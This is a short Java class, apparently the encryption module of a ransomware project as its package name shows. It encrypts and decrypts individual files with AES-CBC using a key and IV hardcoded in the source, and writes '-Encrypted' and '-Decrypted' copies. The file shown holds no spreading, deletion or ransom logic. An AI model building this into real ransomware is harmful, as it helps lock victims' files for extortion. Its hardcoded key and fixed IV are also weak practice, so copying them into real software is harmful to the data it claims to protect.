package RansomeWare;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.Base64;


public class AES {
    private String key = "W6kG$Uv+;XM7HK#!";
    private String initVector = ")B5C*\\)<$xhXdq$d";

    public String encrypt(File inputFile) throws Exception {
        IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));
        SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes("UTF-8"), "AES");

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);

        FileInputStream in = new FileInputStream(inputFile);
        byte[] inputBytes = new byte[(int) inputFile.length()];
        in.read(inputBytes);

        File outputFile = new File(inputFile + "-Encrypted");

        byte[] encrypted = cipher.doFinal(inputBytes);
        FileOutputStream out = new FileOutputStream(outputFile);
        out.write(Base64.getEncoder().encode(encrypted));
        in.close();
        out.close();
        return Base64.getEncoder().encodeToString(encrypted);
    }

    public String decrypt(File encryptedFile) throws Exception {
        IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));
        SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes("UTF-8"), "AES");

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, iv);

        FileInputStream in = new FileInputStream(encryptedFile);
        byte[] inputBytes = new byte[(int) encryptedFile.length()];
        in.read(inputBytes);

        File outputFile = new File(encryptedFile + "-Decrypted");

        byte[] original = cipher.doFinal(Base64.getDecoder().decode(inputBytes));
        FileOutputStream out = new FileOutputStream(outputFile);
        out.write(original);
        in.close();
        out.close();
        return new String(original);

    }

}
